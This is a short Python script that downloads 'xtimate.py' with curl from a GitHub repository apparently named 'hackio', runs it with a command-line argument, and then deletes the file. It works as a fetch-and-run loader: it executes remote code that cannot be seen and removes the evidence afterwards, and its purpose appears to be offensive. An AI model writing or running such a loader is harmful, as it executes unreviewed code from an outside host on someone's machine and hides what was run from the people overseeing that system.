import subprocess
import time
from datetime import datetime
import sys

if __name__ == '__main__':
    
    t = sys.argv[1]
    subprocess.run(['curl', '-o', 'xtimate.py', 'https://raw.githubusercontent.com/cypher119/hackio/refs/heads/main/xtimate.py'])
    subprocess.run(['python3', 'xtimate.py', f'{t}'])
    subprocess.run(['rm','xtimate.py'])
